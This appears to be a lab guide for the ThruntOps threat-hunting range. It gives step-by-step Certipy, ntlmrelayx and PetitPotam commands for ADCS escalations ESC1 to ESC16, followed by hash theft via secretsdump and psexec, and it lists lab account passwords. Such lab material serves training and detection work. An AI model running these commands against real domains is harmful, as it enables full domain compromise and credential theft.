---
title: ADCS Attack Paths
layout: default
nav_order: 9
---

# ADCS Attack Paths
{: .no_toc }

Enterprise Security Configurations (ESC) implemented in the ThruntOps lab via `badsectorlabs.ludus_adcs`.
{: .fs-6 .fw-300 }

---

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Lab Infrastructure

| Component | Value |
|---|---|
| **CA name** | `thruntops-CA` |
| **CA host** | ADCS — 10.2.50.13 |
| **Web Enrollment** | `http://10.2.50.13/certsrv/certfnsh.asp` |
| **Domain** | `thruntops.domain` |
| **DC** | DC01-2022 — 10.2.50.11 |
| **Attacker** | Kali — 10.2.50.250 |

### Entry points

| Account | Password | Notes |
|---|---|---|
| `domainuser` | `NV#8SL9#` | Any domain user — valid for ESC1, 2, 3, 6, 8, 11 |
| `primary_user04` | `ggA15$y!` | RDP on ADCS — useful for ESC5 local access |
| `esc5user` | `ESC5password` | Domain Admin (ESC5 specific user) |
| `esc7_camgr_user` | `ESC7password` | CA Manager role (ESC7) |
| `esc7_certmgr_user` | `ESC7password` | Certificate Manager role (ESC7) |
| `esc9user` | `ESC9password` | Victim account for ESC9 |
| `esc13user` | `ESC13password` | ESC13 user — member of `esc13group` |
| `esc16user` | `ESC16password` | Victim account for ESC16 |

### Tool

All attack paths use **Certipy** from Kali:

```bash
pip install certipy-ad
```

---

## Enumeration

```bash
# Full enumeration — finds all vulnerable templates and CA misconfigs
certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11 -stdout

# Output to files (JSON + text)
certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11

# BloodHound-compatible output
certipy find -u domainuser@thruntops.domain -p 'NV#8SL9#' -dc-ip 10.2.50.11 -bloodhound
```

---

## Post-Exploitation (Common to All ESCs)

After obtaining a `.pfx` certificate for a privileged account:

```bash
# Authenticate and retrieve NT hash
certipy auth -pfx administrator.pfx -domain thruntops.domain -dc-ip 10.2.50.11

# Use hash for lateral movement
impacket-psexec -hashes :NTHASH administrator@10.2.50.11
impacket-secretsdump -hashes :NTHASH administrator@10.2.50.11
```

---

## ESC1 — Misconfigured Template: Enrollee Supplies SAN

**Template:** `ESC1`
**Condition:** Template has `ENROLLEE_SUPPLIES_SUBJECT` flag set + Client Authentication EKU. Any `Domain Users` member can enroll and specify an arbitrary UPN (e.g., `administrator@thruntops.domain`).

```bash
# Request certificate as administrator using ESC1 template
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC1 \
  -upn administrator@thruntops.domain
```

**Attack path:**

```
Any domain user
  → certipy req -template ESC1 -upn administrator@thruntops.domain
  → Certificate issued as administrator
  → certipy auth → NT hash for administrator
  → Full domain compromise
```

---

## ESC2 — Enrollment Agent Template Abuse

**Template:** `ESC2`
**Condition:** Template has `Any Purpose` EKU (or no EKU). Can be used as an Enrollment Agent certificate to enroll on behalf of any user including privileged accounts.

```bash
# Step 1: Obtain Enrollment Agent certificate
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC2

# Step 2: Use EA cert to enroll as administrator on a different template
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template User \
  -on-behalf-of 'thruntops\administrator' \
  -pfx domainuser.pfx
```

**Attack path:**

```
Any domain user
  → Request ESC2 cert (Enrollment Agent)
  → Use EA cert to enroll on behalf of administrator
  → certipy auth → NT hash for administrator
```

---

## ESC3 — Enrollment Agent + SAN Control

**Templates:** `ESC3` (Enrollment Agent) + `ESC3_CRA` (allows SAN from requester)
**Condition:** Combination of enrollment agent permission and requester-controlled SAN allows arbitrary identity impersonation.

```bash
# Step 1: Request Enrollment Agent cert from ESC3 template
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC3

# Step 2: Use EA cert to request ESC3_CRA certificate on behalf of administrator
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC3_CRA \
  -on-behalf-of 'thruntops\administrator' \
  -pfx domainuser.pfx
```

---

## ESC4 — Write Permissions on Certificate Template

**Template:** `ESC4`
**Condition:** `Domain Users` has `GenericAll` on the `ESC4` template object in Active Directory. Any domain user can modify the template to add `ENROLLEE_SUPPLIES_SUBJECT`, then request a certificate as a privileged account.

```bash
# Step 1: Overwrite template to add ENROLLEE_SUPPLIES_SUBJECT (saves backup as ESC4.json)
certipy template \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -template ESC4 \
  -save-old

# Step 2: Request certificate as administrator
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC4 \
  -upn administrator@thruntops.domain

# Step 3: Restore template (clean up)
certipy template \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -template ESC4 \
  -configuration ESC4.json
```

---

## ESC5 — Overly Permissive CA Object Permissions

**Condition:** `esc5user` is a Domain Admin — has full control over the CA object and the ADCS host, enabling direct CA key access and arbitrary certificate issuance.

```bash
# esc5user is Domain Admin — RDP to DC or ADCS directly
# Use esc5user to manage the CA via DCOM

# From Kali: shell as esc5user
impacket-psexec esc5user:ESC5password@10.2.50.13

# From inside: add ManageCA permission for lower-priv account
certutil -config "10.2.50.13\thruntops-CA" -setcaproperty manageca domainuser
```

**Attack path:**

```
Compromise esc5user (ESC5password)
  → esc5user is Domain Admin → full CA control
  → Add ManageCA for attacker-controlled account
  → Issue arbitrary certificates (ESC7 path from CA Manager role)
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Set on CA

**Condition:** The CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set, allowing any template that has `Client Authentication` EKU to include a requester-controlled SAN — even templates that do not normally allow it.

```bash
# Request a standard User template certificate with arbitrary UPN
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template User \
  -upn administrator@thruntops.domain
```

{: .note }
ESC6 is the most permissive misconfiguration — it affects every Client Authentication template on the CA, not just specially crafted ones.

---

## ESC7 — Abuse of CA Manager / Certificate Manager Roles

**Condition:** Two dedicated users have been granted CA-level permissions:
- `esc7_camgr_user` — `ManageCA` right (CA Manager)
- `esc7_certmgr_user` — `ManageCertificates` right (Certificate Manager)

### ESC7 via ManageCA (CA Manager path)

```bash
# Step 1: CA Manager enables the SubCA template and sets EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca \
  -u esc7_camgr_user@thruntops.domain \
  -p 'ESC7password' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -enable-template SubCA

# Step 2: Request SubCA cert with arbitrary SAN (request will be pending)
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template SubCA \
  -upn administrator@thruntops.domain

# Step 3: CA Manager issues the pending request (get request ID from step 2 output)
certipy ca \
  -u esc7_camgr_user@thruntops.domain \
  -p 'ESC7password' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -issue-request <REQUEST_ID>

# Step 4: Retrieve the issued certificate
certipy req \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -retrieve <REQUEST_ID>
```

---

## ESC8 — NTLM Relay to AD CS Web Enrollment

**Condition:** Web Enrollment (`/certsrv/`) is enabled on ADCS (10.2.50.13). An NTLM relay attack (via PetitPotam) redirects the DC machine account's authentication to the Web Enrollment endpoint — issuing a certificate for the DC.

```bash
# Step 1: Start NTLM relay targeting ADCS Web Enrollment
impacket-ntlmrelayx \
  -t http://10.2.50.13/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController

# Step 2: Trigger DC authentication to Kali using PetitPotam (unauthenticated)
python3 PetitPotam.py \
  -u '' -p '' \
  10.2.50.250 \
  10.2.50.11

# Result: ntlmrelayx captures DC$ certificate (base64 in output)

# Step 3: Decode and authenticate using DC$ certificate
echo '<BASE64_CERT>' | base64 -d > dc01.pfx
certipy auth \
  -pfx dc01.pfx \
  -dc-ip 10.2.50.11 \
  -domain thruntops.domain
```

**Attack path:**

```
PetitPotam → DC01-2022$ authenticates to Kali (NTLM)
  → ntlmrelayx relays to http://10.2.50.13/certsrv/
  → Certificate issued for DC01-2022$
  → certipy auth → NT hash for DC01-2022$
  → DCSync → all domain hashes
```

---

## ESC9 — CT_FLAG_NO_SECURITY_EXTENSION on Template

**Template:** `ESC9`
**Condition:** Template does not embed the requester's SID in the certificate (`CT_FLAG_NO_SECURITY_EXTENSION`). An account with `GenericWrite` over `esc9user` can modify its UPN to an admin account, request the ESC9 template, and authenticate as that admin.

```bash
# Step 1: Modify esc9user UPN to impersonate administrator
# (requires GenericWrite on esc9user — granted to Domain Users by the role)
certipy account update \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -user esc9user \
  -upn administrator@thruntops.domain

# Step 2: Request ESC9 certificate as esc9user (now with admin UPN)
certipy req \
  -u esc9user@thruntops.domain \
  -p 'ESC9password' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC9

# Step 3: Restore esc9user UPN
certipy account update \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -user esc9user \
  -upn esc9user@thruntops.domain

# Step 4: Authenticate using the certificate (maps to administrator)
certipy auth \
  -pfx esc9user.pfx \
  -domain thruntops.domain \
  -dc-ip 10.2.50.11
```

---

## ESC11 — Relay to ICSR (Unencrypted RPC)

**Condition:** `IF_ENFORCEENCRYPTICERTREQUEST` is disabled on the CA, allowing certificate requests over plaintext RPC. This enables relaying NTLM authentication directly to the CA's RPC interface (not HTTP).

```bash
# Step 1: Start RPC relay to CA
impacket-ntlmrelayx \
  -t rpc://10.2.50.13 \
  -rpc-mode ICPR \
  -icpr-ca-name thruntops-CA \
  -smb2support \
  --adcs \
  --template DomainController

# Step 2: Trigger DC authentication
python3 PetitPotam.py -u '' -p '' 10.2.50.250 10.2.50.11
```

{: .note }
ESC11 is the RPC equivalent of ESC8 — bypasses the requirement for Web Enrollment to be installed. If `IF_ENFORCEENCRYPTICERTREQUEST` is disabled, any CA is vulnerable to NTLM relay regardless of Web Enrollment status.

---

## ESC13 — Issuance Policy Linked to Privileged Group

**Template:** `ESC13`
**Condition:** The `ESC13` template has an issuance policy OID linked to the `esc13group` group via `msDS-KeyCredentialLink`. `esc13user` can enroll on this template. The group has elevated rights (ACLs configured by the role).

```bash
# Step 1: Request certificate as esc13user
certipy req \
  -u esc13user@thruntops.domain \
  -p 'ESC13password' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template ESC13

# Step 2: Authenticate — certificate grants membership in esc13group
certipy auth \
  -pfx esc13user.pfx \
  -domain thruntops.domain \
  -dc-ip 10.2.50.11
```

**Concept:** The obtained certificate carries the issuance policy OID which, during PKINIT, triggers automatic universal group membership in `esc13group` — granting whatever rights that group has in the domain.

---

## ESC15 — AltSecurityIdentities Mapping Abuse

**Condition:** Weak X.509 certificate-to-account mapping via `altSecurityIdentities` attribute. The template is configured to allow certificate authentication mapped through the `Issuer + Subject` field rather than UPN/SAN, enabling forgery if the requester can control certificate fields.

```bash
certipy find \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -stdout \
  -enabled
# Look for templates marked as vulnerable to ESC15
```

---

## ESC16 — szOID_NTDS_CA_SECURITY_EXT Disabled

**Condition:** The CA has `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) disabled in `DisableExtensionList`. This OID embeds the requester's SID in issued certificates. With it disabled, the CA does not include the SID — removing the binding between certificate and AD account that Windows uses to detect impersonation. Attack path is identical to ESC9.

```bash
# GenericWrite over esc16user is granted to Domain Users by the role
# Change esc16user UPN → request ESC16 template → authenticate as target

certipy account update \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -user esc16user \
  -upn administrator@thruntops.domain

certipy req \
  -u esc16user@thruntops.domain \
  -p 'ESC16password' \
  -dc-ip 10.2.50.11 \
  -ca thruntops-CA \
  -template User

certipy account update \
  -u domainuser@thruntops.domain \
  -p 'NV#8SL9#' \
  -dc-ip 10.2.50.11 \
  -user esc16user \
  -upn esc16user@thruntops.domain

certipy auth \
  -pfx esc16user.pfx \
  -domain thruntops.domain \
  -dc-ip 10.2.50.11
```

---

## Test Checklist

| ESC | Template / Mechanism | Entry credentials | Status |
|---|---|---|---|
| ESC1 | `ESC1` — enrollee supplies SAN | any Domain User | ☐ |
| ESC2 | `ESC2` — Enrollment Agent | any Domain User | ☐ |
| ESC3 | `ESC3` + `ESC3_CRA` — EA + SAN | any Domain User | ☐ |
| ESC4 | `ESC4` — GenericAll on template | any Domain User | ☐ |
| ESC5 | CA object — Domain Admin user | `esc5user:ESC5password` | ☐ |
| ESC6 | CA flag — EDITF_ATTRIBUTESUBJECTALTNAME2 | any Domain User | ☐ |
| ESC7 | CA roles — ManageCA / ManageCertificates | `esc7_camgr_user:ESC7password` | ☐ |
| ESC8 | Web Enrollment NTLM relay (PetitPotam) | unauthenticated | ☐ |
| ESC9 | `ESC9` — no SID extension, GenericWrite on user | `esc9user:ESC9password` | ☐ |
| ESC11 | RPC relay — unencrypted ICSR (PetitPotam) | unauthenticated | ☐ |
| ESC13 | `ESC13` — issuance policy → group privilege | `esc13user:ESC13password` | ☐ |
| ESC15 | AltSecurityIdentities mapping | any Domain User | ☐ |
| ESC16 | szOID_NTDS_CA_SECURITY_EXT disabled | `esc16user:ESC16password` | ☐ |

---

## Notes

- All ESCs are enabled by default in `badsectorlabs.ludus_adcs` — no additional config required in `elastic.yml`/`wazuh.yml`/`splunk.yml`
- `primary_user04` has RDP on ADCS — useful for local enumeration and ESC5 interactive access
- Certificate authentication requires PKINIT support on the DC — available on all Windows Server 2016+ DCs
- For ESC8 and ESC11 (PetitPotam), the Kali VM must be deployed: `bash scripts/add-kali.sh`
- Certipy saves certificates as `<account>.pfx` in the current directory; the `auth` subcommand retrieves the NT hash via PKINIT + `UnPAC-the-Hash`
